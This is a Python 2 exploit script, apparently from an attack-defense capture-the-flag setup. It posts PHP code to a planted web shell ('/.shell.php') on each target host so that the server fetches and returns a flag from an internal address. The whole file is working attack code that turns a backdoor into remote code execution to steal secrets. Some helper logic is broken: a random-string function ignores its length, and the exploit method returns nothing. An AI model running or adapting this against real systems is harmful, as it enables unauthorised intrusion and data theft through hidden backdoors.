#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import sys
import json
import uuid
import hashlib
import time
import random
import timeout_decorator
import string

def random_string_1(length=0x10):
    return "".join(random.choice(string.letters))

class Exploit():
    def __init__(self, author, challenge, debug):
        self.challenge = challenge
        self.author = author
        self.debug = debug

    def run(self, target):
        team = target['team']
        host = target['host']
        port = target['port']
        try:
            flag = self.exploit(host, port)
            if self.debug:
                print flag
            return (True, flag)
        except Exception as e:
            if self.debug:
                print repr(e)
            return (False, repr(e))

    @timeout_decorator.timeout(0x04, use_signals=False)
    def exploit(self, host, port):
        url = "http://%s:%d/.shell.php" % (host, port)
        data = {"c":"var_dump(file_get_contents('http://172.16.0.225:8000/flag'));"}
        print requests.post(url, data=data).content

def main():
    exploit_data = json.loads(sys.argv[1])
    exploit = Exploit(
        exploit_data["author"],
        exploit_data["challenge"],
        exploit_data["debug"],
    )
    target_data = json.loads(sys.argv[2])
    target = {
        "team":target_data["team"],
        "host":target_data["host"],
        "port":target_data["port"],
    }
    exploit.run(target)

if __name__ == "__main__":
    main()
